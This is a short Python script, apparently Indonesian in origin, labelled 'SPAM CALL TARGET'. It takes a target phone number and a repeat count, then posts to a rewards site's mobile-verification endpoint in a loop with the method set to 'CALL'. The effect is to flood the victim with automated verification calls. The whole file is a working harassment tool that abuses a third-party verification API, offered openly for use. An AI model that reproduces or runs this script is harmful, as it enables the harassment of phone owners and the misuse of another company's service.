# Script  Code By Najimi Ajimu
#100% Open Source
#Dilarang Keras Menjual File Tanpa Seijin Author
import os,sys,time,requests
from time import sleep

def mengetik(z):
    for e in z + "\n":
      sys.stdout.write(e)
      sys.stdout.flush()
      time.sleep(0.05)
os.system("clear")

os.system('xdg-open https://youtube.com/channel/UCzEhsJYu90gM5A8lmv1axYQ')

banner= """
\033[1;30m<════════════[\033[1;33;41m • \033[1;37m SPAM CALL TARGET \033[1;33m• \033[0m\033[1;30m]══════════════>
\033[37m===================================================\033[37m
\033[37m[\033[31m•\033[31m\033[37m]\033[37m\033[32m Author \033[37m  :\033[33m Najimi Ajimu
\033[37m[\033[31m•\033[37m]\033[32m GitHub\033[37m   : \033[33mhttps:github.com/Ruphas-Mafahl-XD
\033[37m[\033[31m•\033[37m]\033[32m Youtube\033[37m  : \033[33mMuhammad Arya Adinata
\033[37m===================================================\033[37m"""
sleep(1)
print(banner)

print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m PILIHAN Nomor \033[1;33m• \033[0m\033[1;30m]══════════════>")
print ("\033[37m[\033[31m•\033[37m]\033[32m Contoh Nomor\033[37m : \033[37m\033[33m8Xxx\033[33m")
nomor = input("\033[37m[\033[31m•\033[37m]\033[32m Nomor Target\033[32m \033[37m:\033[37m\033[33m ")
print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m MASUKAN JUMLAH \033[1;33m• \033[0m\033[1;30m]══════════════>")
jumlah = int(input("\033[37m[\033[31m•\033[37m]\033[32m Jumlah Spam\033[37m :\033[37m\033[33m "))
mengetik("[KALO SUDAH LIMIT TUNGUH BEBERAPA MENIT LAGI BARU ULANG] ")
time.sleep(3)

url = "https://id.jagreward.com/member/verify-mobile/"
ua = {'Host': "id.jagreward.com",'Connection': "keep-alive",'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'}
dat = {"method": "CALL","countryCode": "id",}

for i in range(jumlah):
    send = requests.post(url+nomor, headers=ua, data=dat)
    print(" [â€¢] Status ~+> ",(send.json()["message"]))

